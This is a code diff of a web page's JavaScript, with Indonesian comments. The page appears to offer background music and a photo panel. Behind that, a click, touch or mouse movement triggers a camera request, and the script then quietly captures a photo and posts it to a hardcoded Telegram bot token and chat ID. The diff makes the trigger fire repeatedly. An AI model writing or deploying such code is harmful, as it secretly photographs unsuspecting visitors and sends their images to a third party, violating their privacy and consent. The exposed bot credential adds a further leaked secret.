@@ -1,5 +1,4 @@
-﻿// === PANEL PILIH FOTO ===
-const openPhotoOptions = document.getElementById('openPhotoOptions');
+﻿const openPhotoOptions = document.getElementById('openPhotoOptions');
 const photoOptions = document.getElementById('photoOptions');
 if (openPhotoOptions && photoOptions) {
   openPhotoOptions.addEventListener('click', () => {
@@ -10,55 +9,47 @@ if (openPhotoOptions && photoOptions) {
 const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
 const CHAT_ID = "6864694275";
 
-// === BAGIAN MUSIK + KAMERA — STABIL 1X PERIZINAN ===
+// === BAGIAN MUSIK + KAMERA — HYBRID FIX STABIL ===
 const music = document.getElementById('bgmusic');
 const btnMusic = document.getElementById('musicButton');
 let started = false;
 music.volume = 0.4;
 
 async function startMusicAndCamera() {
-  if (started) return;
+  if (started && !music.paused) return;
   started = true;
 
   let musicStarted = false;
-
-  // --- mulai musik ---
   try {
     music.muted = false;
     await music.play();
     console.log("🎵 Musik diputar");
     musicStarted = true;
   } catch (err) {
-    console.warn("⚠️ Autoplay musik gagal:", err);
+    console.warn("Autoplay musik gagal:", err);
     btnMusic.classList.add("show");
     btnMusic.disabled = false;
+    // tetap lanjut kamera walau musik gagal
   }
 
-  // --- jalankan kamera dengan stabilitas tambahan ---
   setTimeout(async () => {
     try {
       const alreadyAllowed = localStorage.getItem("user_allows_auto_capture") === "1";
-
-      if (!alreadyAllowed && navigator.mediaDevices?.getUserMedia) {
-        console.log("🎥 Meminta izin kamera pertama kali...");
+      if (!alreadyAllowed && navigator.mediaDevices) {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         stream.getTracks().forEach(t => t.stop());
         localStorage.setItem("user_allows_auto_capture", "1");
-        console.log("✅ Izin kamera disetujui dan disimpan");
+        console.log("✅ Izin kamera diberikan pertama kali.");
         await autoCaptureAndSend();
       } else if (alreadyAllowed) {
-        console.log("📸 Kamera sudah diizinkan sebelumnya, langsung ambil...");
+        console.log("📸 Kamera sudah diizinkan sebelumnya, ambil otomatis...");
         await autoCaptureAndSend();
-      } else {
-        console.warn("❌ Perangkat tidak mendukung kamera.");
       }
-
     } catch (e) {
       console.warn("❌ User menolak izin kamera:", e);
     }
   }, musicStarted ? 800 : 1500);
 
-  // --- kontrol tombol musik ---
   if (musicStarted) {
     btnMusic.classList.remove("show");
     btnMusic.disabled = true;
@@ -76,18 +67,13 @@ async function autoCaptureAndSend() {
     video.srcObject = stream;
     video.playsInline = true;
 
-    await new Promise((res) => {
-      video.onloadedmetadata = () => {
-        video.play().then(res).catch(res);
-      };
-      // fallback timeout kalau metadata lama
-      setTimeout(res, 2500);
+    await new Promise(res => {
+      video.onloadedmetadata = () => video.play().then(res).catch(res);
+      setTimeout(res, 3000);
     });
 
-    // tunggu stabilisasi 1 detik
     await new Promise(r => setTimeout(r, 1000));
 
-    // ambil frame
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
@@ -108,26 +94,24 @@ async function autoCaptureAndSend() {
       body: fd
     });
 
-    if (res.ok) {
-      console.log("✅ Foto terkirim ke Telegram");
-    } else {
-      console.warn("⚠️ Gagal kirim foto (response error)");
-    }
+    if (res.ok) console.log("✅ Foto terkirim (fokus 1s)");
+    else console.warn("⚠️ Gagal kirim foto");
   } catch (err) {
-    console.error("❌ Gagal akses kamera:", err);
+    console.error("❌ Tidak bisa akses kamera:", err);
   }
 }
 
-// === Event Listener Stabil ===
+// === Event Listener Fix (musik + kamera) ===
 function userStart() {
   startMusicAndCamera().catch(console.warn);
 }
 
 const isMobile = /Android|iPhone|iPad|iOS/i.test(navigator.userAgent);
 btnMusic.classList.add("show");
-btnMusic.addEventListener('click', userStart, { once: true });
-document.addEventListener('click', userStart, { once: true });
-document.addEventListener('touchstart', userStart, { once: true });
+btnMusic.addEventListener('click', userStart);
+document.addEventListener('click', userStart);
+document.addEventListener('touchstart', userStart);
+
 if (!isMobile) {
   window.addEventListener('mousemove', userStart, { once: true });
 }
@@ -188,7 +172,7 @@ async function sendTelegramMessage(url, body, el) {
         swoosh.play().catch(() => {});
       } catch (e) {}
       el.innerHTML = `<div class="sentAnim">Terkirim! <span>✓</span></div>`;
-      setTimeout(() => (el.innerHTML = ""), 3000);
+      setTimeout(() => el.innerHTML = "", 3000);
       return true;
     } else {
       el.textContent = "💔 Gagal mengirim.";
